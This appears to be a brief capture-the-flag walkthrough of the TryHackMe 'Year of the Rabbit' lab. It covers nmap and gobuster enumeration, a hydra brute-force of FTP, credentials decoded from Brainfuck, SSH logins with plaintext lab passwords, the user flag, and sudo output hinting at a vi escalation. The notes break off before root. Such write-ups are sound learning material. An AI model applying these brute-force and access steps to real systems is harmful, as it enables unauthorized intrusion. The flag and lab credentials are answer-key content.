## IP

10.10.103.126

## NAMP 
nmap -sV ip
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-28 23:58 -03
Nmap scan report for 10.10.103.126 (10.10.103.126)
Host is up (0.22s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## GOBUSTER
#### Porta 80
gobuster dir -u http://10.10.103.126:80 -w /usr/share/wordlists/dirb/common.txt -t 10
```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.103.126:80
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/29 00:01:56 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/assets (Status: 301)
/index.html (Status: 200)
/server-status (Status: 403)
===============================================================
2020/09/29 00:03:39 Finished
===============================================================
```

## BURP 
```
GET /intermediary.php?hidden_directory=/WExYY2Cv-qU HTTP/1.1
Host: 10.10.103.126
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

## Links
/sup3r_s3cret_fl4g.php
/intermediary.php?hidden_directory=/WExYY2Cv-qU

## on save image
http://10.10.121.8/WExYY2Cv-qU/
string image.png > image_logs

## FTP BY HYDRA
RUN
```
hydra -l ftpuser -P ./ftp_pass_list.txt ftp://10.10.121.8 
```
##### RESULT
[21][ftp] host: 10.10.121.8   login: ftpuser   password: 5iez1wGXKfPKQ

##### Connect on FTP
ftp 10.10.121.8

## Brain Fuck String Format
In ftp get cat "Eli's_Creds.txt"
use https://copy.sh/brainfuck/
Result:
```
User: eli
Password: DSpDiM1wAEwid
```

## SSH 
ssh eli@10.10.121.8 pass DSpDiM1wAEwid
ssh gwendoline@10.10.121.8 pass MniVCQVhQHUNI

## USER FLAG
THM{1107174691af9ff3681d2b5bdb5740b1589bae53}


## Get Root
in gwendoline run 
```
sudo -l
```
Response: 
----
Matching Defaults entries for gwendoline on year-of-the-rabbit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt

----
